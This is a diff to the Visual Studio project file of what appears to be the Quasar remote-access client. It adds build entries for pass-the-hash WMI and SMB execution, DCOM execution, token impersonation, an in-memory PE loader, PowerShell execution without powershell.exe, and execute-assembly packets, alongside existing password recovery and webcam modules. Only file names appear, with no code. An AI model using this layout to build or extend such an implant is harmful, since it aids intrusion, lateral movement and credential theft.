@@ -10,9 +10,10 @@
     <AppDesignerFolder>Properties</AppDesignerFolder>
     <RootNamespace>xClient</RootNamespace>
     <AssemblyName>Client</AssemblyName>
-    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
-    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
     <PlatformTarget>x86</PlatformTarget>
@@ -24,6 +25,7 @@
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
     <PlatformTarget>x86</PlatformTarget>
@@ -35,6 +37,7 @@
     <WarningLevel>4</WarningLevel>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
     <DebugSymbols>false</DebugSymbols>
+    <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <PropertyGroup>
     <StartupObject>xClient.Program</StartupObject>
@@ -43,11 +46,29 @@
     <ApplicationManifest>app.manifest</ApplicationManifest>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="Microsoft.Office.Interop.Excel, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Office.Interop.Excel.15.0.4795.1000\lib\net20\Microsoft.Office.Interop.Excel.dll</HintPath>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </Reference>
+    <Reference Include="Microsoft.Office.Interop.Outlook, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Office.Interop.Outlook.15.0.4797.1003\lib\net20\Microsoft.Office.Interop.Outlook.dll</HintPath>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </Reference>
+    <Reference Include="Microsoft.Office.Interop.Word, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Office.Interop.Word.15.0.4797.1003\lib\net20\Microsoft.Office.Interop.Word.dll</HintPath>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </Reference>
     <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="System" />
+    <Reference Include="System.Configuration.Install" />
     <Reference Include="System.Data" />
     <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
+    <Reference Include="System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Program Files\Reference Assemblies\Microsoft\WindowsPowerShell\v1.0\System.Management.Automation.dll</HintPath>
+    </Reference>
     <Reference Include="System.Runtime.Serialization" />
     <Reference Include="System.Security" />
     <Reference Include="System.Windows.Forms" />
@@ -87,11 +108,14 @@
     <Compile Include="Core\AForge\Video.DirectShow\VideoInput.cs" />
     <Compile Include="Core\AForge\Video\IVideoSource.cs" />
     <Compile Include="Core\AForge\Video\VideoEvents.cs" />
+    <Compile Include="Core\Commands\DCOMHandler.cs" />
+    <Compile Include="Core\Commands\PTHExecHandler.cs" />
     <Compile Include="Core\Commands\RegistryHandler.cs" />
     <Compile Include="Core\Commands\TCPConnectionsHandler.cs" />
     <Compile Include="Core\Commands\WebcamHandler.cs" />
     <Compile Include="Core\Data\ClientData.cs" />
     <Compile Include="Core\Data\GeoInformation.cs" />
+    <Compile Include="Core\Data\ImpersonationSafeHandle.cs" />
     <Compile Include="Core\Forms\FrmAgentChat.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -99,7 +123,13 @@
       <DependentUpon>FrmAgentChat.cs</DependentUpon>
     </Compile>
     <Compile Include="Core\Helper\CryptographyHelper.cs" />
+    <Compile Include="Core\Helper\DCOMHelper.cs" />
     <Compile Include="Core\Helper\MutexHelper.cs" />
+    <Compile Include="Core\Helper\NetPELoaderHelper.cs" />
+    <Compile Include="Core\Helper\PowerPickHelper.cs" />
+    <Compile Include="Core\Helper\PTHWMIExecHelper.cs" />
+    <Compile Include="Core\Helper\PTHSMBExecHelper.cs" />
+    <Compile Include="Core\Helper\TokenContextHelper.cs" />
     <Compile Include="Core\Helper\WindowsAccountHelper.cs" />
     <Compile Include="Core\Helper\FileHelper.cs" />
     <Compile Include="Core\Helper\FormatHelper.cs" />
@@ -110,6 +140,7 @@
     <Compile Include="Core\Helper\ScreenHelper.cs" />
     <Compile Include="Core\Helper\DevicesHelper.cs" />
     <Compile Include="Core\Helper\SystemHelper.cs" />
+    <Compile Include="Core\Helper\WindowsAPIHelper.cs" />
     <Compile Include="Core\Installation\ClientInstaller.cs" />
     <Compile Include="Core\Installation\ClientUninstaller.cs" />
     <Compile Include="Core\Installation\ClientUpdater.cs" />
@@ -137,6 +168,11 @@
     <Compile Include="Core\Cryptography\SHA256.cs" />
     <Compile Include="Core\Extensions\RegistryKeyExtensions.cs" />
     <Compile Include="Core\Networking\QuasarClient.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetChangeToken.cs" />
+    <Compile Include="Core\Packets\ClientPackets\DoExecuteAssemblyResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\DoExecuteWMIResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\DoSMBExecResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetPowerPick.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetStopChatAgent.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetChangeRegistryValueResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetConnectionsResponse.cs" />
@@ -151,8 +187,13 @@
     <Compile Include="Core\Packets\ClientPackets\GetRegistryKeysResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetRenameRegistryKeyResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetRenameRegistryValueResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\DoWMIExecResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\SetStatusFileManager.cs" />
     <Compile Include="Core\Packets\PacketRegistery.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoEnableImpersonation.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetChangeToken.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoExecuteAssembly.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoExecuteWMI.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoStartChat.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoWebcamStop.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoAskElevate.cs" />
@@ -168,10 +209,13 @@
     <Compile Include="Core\Packets\ServerPackets\DoRenameRegistryValue.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetConnections.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetMessage.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoSMBExec.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetPowerPick.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetStopChatAgent.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetWebcam.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetWebcams.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoWMIExec.cs" />
     <Compile Include="Core\Packets\ServerPackets\SetAuthenticationSuccess.cs" />
     <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
     <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
@@ -309,7 +353,9 @@
       <DependentUpon>Resources.resx</DependentUpon>
       <DesignTime>True</DesignTime>
     </Compile>
+    <None Include="app.config" />
     <None Include="app.manifest" />
+    <None Include="packages.config" />
     <None Include="Properties\Settings.settings">
       <Generator>SettingsSingleFileGenerator</Generator>
       <LastGenOutput>Settings.Designer.cs</LastGenOutput>
@@ -323,7 +369,6 @@
   <ItemGroup>
     <Content Include="Core\MouseKeyHook\HotKeys\ReadMe.txt" />
   </ItemGroup>
-  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
     <PostBuildEvent Condition="'$(OS)' == 'Windows_NT' ">copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
